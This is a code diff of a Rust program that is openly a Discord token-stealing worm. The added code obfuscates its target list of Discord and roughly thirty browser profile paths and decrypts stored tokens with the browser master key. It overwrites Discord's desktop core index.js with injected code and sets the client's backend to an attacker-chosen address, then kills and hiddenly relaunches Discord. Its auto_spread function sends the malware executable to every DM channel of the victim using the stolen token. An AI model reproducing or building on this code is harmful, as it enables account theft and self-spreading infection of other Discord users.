@@ -1,145 +1,193 @@
-#[path = "constants.rs"]
-mod constants;
-#[path = "crypto.rs"]
-mod crypto;
+use crate::{crypto, utils};
+
 use leveldb::database::Database;
 use leveldb::options::{Options, ReadOptions};
+use reqwest::blocking::multipart;
 use serde_json::Value;
-use winapi::um::shellapi::ShellExecuteA;
-use winapi::um::winuser::SW_HIDE;
 use std::ffi::CString;
+use std::path::{Path, PathBuf};
 use std::{env, fs};
-use std::{
-    path::{Path, PathBuf},
-};
 use sysinfo::{ProcessExt, SystemExt};
 use uuid::Uuid;
 use walkdir::WalkDir;
+use winapi::um::shellapi::ShellExecuteA;
+use winapi::um::winuser::SW_HIDE;
+
+// Discord clients to infect
+const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
+    ("Local\\Discord", "Discord.exe", "Discord.lnk"),
+    (
+        "Local\\DiscordCanary",
+        "DiscordCanary.exe",
+        "DiscordCanary.lnk",
+    ),
+    ("Local\\DiscordPTB", "DiscordPTB.exe", "DiscordPTB.lnk"),
+    (
+        "Local\\DiscordDevelopment",
+        "DiscordDevelopment.exe",
+        "Discord Development.lnk",
+    ),
+];
+
+const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
+
+fn get_token_targets() -> Vec<String> {
+    let mut targets = Vec::new();
+    targets.push(obfstr::obfstr!("Roaming\\discord").to_string());
+    targets.push(obfstr::obfstr!("Roaming\\discordcanary").to_string());
+    targets.push(obfstr::obfstr!("Roaming\\discordptb").to_string());
+    targets.push(obfstr::obfstr!("Roaming\\discorddevelopement").to_string());
+    targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera Stable").to_string());
+    targets.push(obfstr::obfstr!("Local\\Google\\Chrome\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Google(x86)\\Chrome\\User Data\\Default").to_string());
+    targets.push(
+        obfstr::obfstr!("Local\\BraveSoftware\\Brave-Browser\\User Data\\Default").to_string(),
+    );
+    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Chromunium\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Epic Privacy Browser\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Amigo\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Vivaldi\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Orbitum\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Mail.Ru\\Atom\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Kometa\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Comodo\\Dragon\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Torch\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Comodo\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Slimjet\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\360Browser\\Browser\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Maxthon3\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\K-Melon\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Sputnik\\Sputnik\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Nichrome\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\CocCoc\\Browser\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\uCozMedia\\Uran\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Chromodo\\User Data\\Default").to_string());
+    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser\\User Data\\Default").to_string());
+
+    targets
+}
 
 fn infect_client(
     client_dir: &PathBuf,
     client_executable: &'static str,
     shortcut_name: &'static str,
+    backend: &'static str,
 ) {
     for entry in WalkDir::new(client_dir).follow_links(true) {
         let entry = entry.unwrap();
-        let path = entry.path();
 
-        if path.is_dir() {
-            if path.to_string_lossy().ends_with("discord_desktop_core") {
-                fs::write(path.join("index.js"), constants::INJECT_CODE).unwrap();
+        if entry.file_type().is_dir() {
+            if entry
+                .path()
+                .to_string_lossy()
+                .ends_with("discord_desktop_core")
+            {
+                fs::write(entry.path().join("index.js"), INJECT_CODE).unwrap();
 
-                let options_path = path.join("package.json");
+                let options_path = entry.path().join("package.json");
 
                 let contents = fs::read_to_string(&options_path).unwrap();
 
                 let mut config: Value = serde_json::from_str(&contents).unwrap();
-                config["backend"] = Value::String(constants::BACKEND.to_string());
+                config["backend"] = Value::String(backend.to_string());
                 config["first_time"] = Value::Bool(true);
                 fs::write(&options_path, config.to_string()).unwrap();
             }
         }
     }
 
-    if constants::REFRESH_DISCORD {
-        let mut system = sysinfo::System::new();
-        system.refresh_all();
+    let mut system = sysinfo::System::new();
+    system.refresh_all();
 
-        let roaming = env::var("APPDATA").unwrap();
-        let roaming_path = Path::new(roaming.as_str());
+    let roaming = env::var("APPDATA").unwrap();
+    let roaming_path = Path::new(roaming.as_str());
 
-        if system.processes_by_name(client_executable).count() == 0 {
-            return;
+    if system.processes_by_name(client_executable).count() > 0 {
+        for process in system.processes_by_name(client_executable) {
+            process.kill();
         }
 
-            for process in system.processes_by_name(client_executable) {
-                process.kill();
+        let shortcut_dir = roaming_path.join(obfstr::obfstr!(
+            "Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"
+        ));
+        let shortcut_path = shortcut_dir.join(shortcut_name);
+
+        if shortcut_path.exists() {
+            let lp_file = CString::new(shortcut_path.to_str().unwrap()).unwrap();
+
+            unsafe {
+                ShellExecuteA(
+                    std::ptr::null_mut(),
+                    std::ptr::null(),
+                    lp_file.as_ptr(),
+                    std::ptr::null(),
+                    std::ptr::null(),
+                    SW_HIDE,
+                );
             }
-
-            let shortcut_dir =
-                roaming_path.join("Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc");
-            let shortcut_path = shortcut_dir.join(shortcut_name);
-
-            if shortcut_path.exists() {
-                let lp_file = CString::new(shortcut_path.to_str().unwrap()).unwrap();
-
-                unsafe {
-                    ShellExecuteA(
-                        std::ptr::null_mut(),
-                        std::ptr::null(),
-                        lp_file.as_ptr(),
-                        std::ptr::null(),
-                        std::ptr::null(),
-                        SW_HIDE,
-                    );
-                }
-            }
+        }
     }
 }
 
-pub fn infect_clients() {
+pub fn auto_spread(token: &String, message: &String) {
+    let client = reqwest::blocking::Client::new();
+
+    let channels_request = client
+        .get("https://discord.com/api/users/@me/channels")
+        .header("Authorization", token)
+        .send();
+
+    let channels_response = match channels_request {
+        Ok(relationships_response) => relationships_response,
+        Err(_) => return,
+    };
+
+    let channels: Value = match serde_json::from_str(&channels_response.text().unwrap()) {
+        Ok(channels) => channels,
+        Err(_) => return,
+    };
+
+    let executable_path = env::current_exe().unwrap();
+    let file_name = executable_path.file_stem().unwrap().to_str().unwrap();
+
+    for channel in channels.as_array().unwrap() {
+        let form = multipart::Form::new()
+            .text("content", message.clone())
+            .file(file_name.to_owned(), &executable_path)
+            .unwrap();
+
+        client
+            .post(format!(
+                "https://discord.com/channels/{}/messages",
+                channel["id"]
+            ))
+            .header("Authorization", token)
+            .multipart(form)
+            .send()
+            .unwrap();
+    }
+}
+
+pub fn infect_clients(backend: &'static str) {
     let userprofile_env = env::var("USERPROFILE").unwrap();
     let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");
 
-    for (path, client_executable, shortcut_name) in constants::CLIENT_TARGETS.iter() {
+    for (path, client_executable, shortcut_name) in CLIENT_TARGETS.iter() {
         let client_dir = appdata_dir.join(path);
 
         if client_dir.exists() {
-            infect_client(
-                &client_dir,
-                client_executable,
-                shortcut_name
-            );
+            infect_client(&client_dir, client_executable, shortcut_name, backend);
         }
     }
 }
 
-fn decrypt_token(cipher_text: &str, local_state_path: &PathBuf) -> Option<String> {
+fn decrypt_token(ciphertext: &str, local_state_path: &PathBuf) -> Option<String> {
     if let Some(master_key) = crypto::get_master_key(&local_state_path) {
-        let plain_text = crypto::aes_decrypt(base64::decode(cipher_text).ok().unwrap(), &master_key);
-        return Some(String::from_utf8(plain_text).ok().unwrap());
+        let plaintext = crypto::aes_decrypt(base64::decode(ciphertext).ok()?, &master_key);
+        return Some(String::from_utf8(plaintext).ok()?);
     }
     return None;
-}
-
-pub fn copy_directory<U: AsRef<Path>, V: AsRef<Path>>(
-    src: U,
-    dst: V,
-) -> Result<(), std::io::Error> {
-    let mut stack = Vec::new();
-    stack.push(PathBuf::from(src.as_ref()));
-
-    let output_root = PathBuf::from(dst.as_ref());
-    let input_root = PathBuf::from(src.as_ref()).components().count();
-
-    while let Some(working_path) = stack.pop() {
-        let src: PathBuf = working_path.components().skip(input_root).collect();
-
-        let dest = if src.components().count() == 0 {
-            output_root.clone()
-        } else {
-            output_root.join(&src)
-        };
-
-        if fs::metadata(&dest).is_err() {
-            fs::create_dir_all(&dest)?;
-        }
-
-        for entry in fs::read_dir(working_path)? {
-            let entry = entry?;
-            let path = entry.path();
-
-            if path.is_dir() {
-                stack.push(path);
-            } else {
-                if let Some(filename) = path.file_name() {
-                    fs::copy(&path, &dest.join(filename))?;
-                }
-            }
-        }
-    }
-
-    Ok(())
 }
 
 pub fn get_tokens() -> Vec<String> {
@@ -149,7 +197,7 @@ pub fn get_tokens() -> Vec<String> {
 
     let mut tokens = Vec::new();
 
-    for token_target in constants::TOKEN_TARGETS {
+    for token_target in get_token_targets() {
         let token_dir = appdata_dir.join(token_target);
 
         if !token_dir.exists() {
@@ -164,7 +212,7 @@ pub fn get_tokens() -> Vec<String> {
 
         let temp_dir = temp_env.join(Uuid::new_v4().to_string());
 
-        if copy_directory(&leveldb_dir, &temp_dir).is_err() {
+        if utils::copy_directory(&leveldb_dir, &temp_dir).is_err() {
             continue;
         }
 
